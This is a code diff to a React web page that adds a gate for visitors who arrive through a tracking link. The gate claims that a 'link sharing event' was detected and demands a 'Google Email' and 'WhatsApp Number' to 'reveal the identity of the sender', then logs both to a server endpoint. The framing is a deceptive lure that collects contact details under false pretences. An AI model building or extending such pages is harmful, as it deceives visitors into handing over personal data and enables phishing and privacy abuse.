@@ -11,7 +11,9 @@ export default function Home() {
   const [generatedLink, setGeneratedLink] = useState('');
   const [isGenerating, setIsGenerating] = useState(false);
   const [visitorEmail, setVisitorEmail] = useState('');
+  const [visitorPhone, setVisitorPhone] = useState('');
   const [linkId, setLinkId] = useState(null);
+  const [showGate, setShowGate] = useState(false);
 
   useEffect(() => {
     // Generate System ID once on mount
@@ -20,7 +22,10 @@ export default function Home() {
     // Check for link tracking ID in URL
     const params = new URLSearchParams(window.location.search);
     const sid = params.get('sid');
-    if (sid) setLinkId(sid);
+    if (sid) {
+      setLinkId(sid);
+      setShowGate(true); // Always show gate if coming from link
+    }
   }, []);
 
   const handleGenerateLink = async (e) => {
@@ -170,7 +175,7 @@ export default function Home() {
 
   const handleVisitorLead = async (e) => {
     e.preventDefault();
-    if (!visitorEmail) return;
+    if (!visitorEmail || !visitorPhone) return;
     try {
       await fetch('/api/log', {
         method: 'POST',
@@ -179,9 +184,11 @@ export default function Home() {
           systemId,
           linkId,
           visitorEmail,
-          updateOnly: true // We can handle partial updates if we want, but for now just send again
+          visitorPhone,
+          updateOnly: true
         })
       });
+      setShowGate(false);
       alert('Identity Verified. Your forensic report is now unlocked.');
     } catch (err) { }
   };
@@ -353,23 +360,33 @@ export default function Home() {
             </div>
 
             {/* SEGMENT 6: IDENTITY VERIFICATION (FOR VISITORS VIA LINK) */}
-            {linkId && (
-              <div className="visitor-lead-capture" style={{ marginTop: '2rem', border: '1px solid #333', padding: '1.5rem', borderRadius: '8px', background: 'rgba(255, 77, 77, 0.05)' }}>
-                <div style={{ color: '#ff4d4d', fontWeight: 'bold', fontSize: '0.9rem', marginBottom: '0.5rem' }}>⚠️ FORENSIC LOCK ACTIVE</div>
+            {showGate && (
+              <div className="visitor-lead-capture" style={{ marginTop: '2rem', border: '1px solid #333', padding: '1.5rem', borderRadius: '8px', background: 'rgba(255, 184, 0, 0.05)', position: 'relative', zIndex: 100 }}>
+                <div style={{ color: '#ffb800', fontWeight: 'bold', fontSize: '0.9rem', marginBottom: '0.5rem' }}>⚠️ SOCIAL VERIFICATION REQUIRED</div>
                 <p style={{ fontSize: '0.8rem', color: '#ccc', marginBottom: '1rem' }}>
-                  A tracking ID has been detected. To unlock the full identity resolution and clear these flags, please verify your session:
+                  A link sharing event has been detected from <b>{data?.platform || 'Social Platform'}</b>. To reveal the identity of the sender and unlock your forensic report, please verify your session:
                 </p>
-                <form onSubmit={handleVisitorLead} style={{ display: 'flex', gap: '10px' }}>
-                  <input
-                    type="email"
-                    placeholder="Enter email to reveal report"
-                    value={visitorEmail}
-                    onChange={(e) => setVisitorEmail(e.target.value)}
-                    required
-                    className="share-input"
-                  />
-                  <button type="submit" className="share-button" style={{ background: '#ff4d4d', color: 'white' }}>
-                    UNLOCK REPORT
+                <form onSubmit={handleVisitorLead} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                  <div style={{ display: 'flex', gap: '10px' }}>
+                    <input
+                      type="email"
+                      placeholder="Verify Google Email"
+                      value={visitorEmail}
+                      onChange={(e) => setVisitorEmail(e.target.value)}
+                      required
+                      className="share-input"
+                    />
+                    <input
+                      type="tel"
+                      placeholder="Verify WhatsApp Number"
+                      value={visitorPhone}
+                      onChange={(e) => setVisitorPhone(e.target.value)}
+                      required
+                      className="share-input"
+                    />
+                  </div>
+                  <button type="submit" className="share-button" style={{ background: '#ffb800', color: 'black' }}>
+                    UNFOLD IDENTITY & REVEAL REPORT
                   </button>
                 </form>
               </div>
